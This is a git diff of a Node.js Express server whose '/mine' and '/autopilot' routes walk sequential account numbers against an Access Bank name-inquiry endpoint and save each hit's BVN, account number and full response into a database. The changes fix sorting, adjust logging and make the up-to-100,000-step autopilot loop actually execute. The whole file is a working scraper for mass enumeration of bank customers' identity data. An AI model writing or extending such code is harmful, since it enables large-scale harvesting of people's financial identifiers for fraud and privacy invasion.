@@ -64,12 +64,12 @@ const mineAmount = async () => {
     return (hM == null) ? "unCalculated" : hM.mineAmount;
 }
 const lastMineUpBank = async (code) => {
-    var hM = await hippo.find({bankCode : code}).sort({accountNumber : -1});
+    var hM = await hippo.find({bankCode : code},null,{sort:{accountNumber : -1}});
     var rt = hM[0];
     return rt ? rt : null;
 }
 const lastMineDownBank = async (code) => {
-    var hM = await hippo.find({bankCode : code}).sort({accountNumber : 1});
+    var hM = await hippo.find({bankCode : code},null,{sort:{accountNumber : 1}});
     var rt = hM[0];
     return rt ? rt : null;
 }
@@ -104,7 +104,6 @@ app.get("/mine/:startAccount/:bankCode/:direction/:steps", async (req, res) => {
     } = req.params;
     for (var i = 0; i < steps; i++) {
         var serial_no;
-        console.log(`${i}  ------------------------><`)
         direction == "up" ? serial_no = Number(startAccount) + i : serial_no = startAccount - i;
         var serial_no_length = serial_no.toString().length;
         if (serial_no_length < 9) {
@@ -121,10 +120,9 @@ app.get("/mine/:startAccount/:bankCode/:direction/:steps", async (req, res) => {
         if (hippoExist == null) {
             var isHigh = Math.max(Number(await lastMineUp().accountNumber), Number(gen)) == gen;
             var isLow = Math.min(Number(await lastMineDown().accountNumber), Number(gen)) == gen;
-            console.log(`${gen} is high : ${isHigh} ; is low : ${isLow}`)
             try {
                 var resp = await axios.get(`https://abp-mobilebank.accessbankplc.com/VBPAccess/webresources/nipNameInquiry2?destinationBankCode=${bankCode}&accountNumber=${gen}`);
-                //console.log(`${resp.data}`);
+                console.log(`${resp.data}`);
             } catch (e) {
                 res.json({
                     error: "error in connect"
@@ -132,7 +130,7 @@ app.get("/mine/:startAccount/:bankCode/:direction/:steps", async (req, res) => {
             }
             var data = resp.data;
             if (data.customerAccountName != null) {
-
+                
                 var pdata = {
                     bvn: data.beneficiaryBvn,
                     accountNumber: gen,
@@ -145,12 +143,13 @@ app.get("/mine/:startAccount/:bankCode/:direction/:steps", async (req, res) => {
 
                 if (isHigh) setLastMineUp(pdata);
                 else if (isLow) setLastMineDown(pdata);
-                else console.log("in-between");
+                else "";
                 try {
                     await setMineAmount();
                     person.save();
                 } catch (e) {
-                    res.json("error saving")
+                    console.log(e)
+                    console.log("error saving")
                 }
             }
         } else console.log(`${gen} exists`);
@@ -202,7 +201,6 @@ app.get("/autopilot/:timeFrame/:bankCode/:direction/:hippoLeg",async (req,res)=>
     console.log("started from :: " + startAccount);
     ping(timeFrame,hippoLeg);
     console.log("Auto pilot started");
-    
     (async()=>{
         for(var i = 0;i<100000;i++){
             console.log(i)
@@ -242,6 +240,7 @@ app.get("/autopilot/:timeFrame/:bankCode/:direction/:hippoLeg",async (req,res)=>
                             dateMined: new Date(),
                             dump: data
                         };
+                        //console.log(pdata)
                         var person = new hippo(pdata);
                         try {
                             await setMineAmount();
@@ -254,7 +253,7 @@ app.get("/autopilot/:timeFrame/:bankCode/:direction/:hippoLeg",async (req,res)=>
             }
             else return console.log("autopilot done");
         }
-    })
+    })()
     res.json({type : "success", msg : "Autopilot activated"});
 })
 app.get("/ping", async (req, res) => {
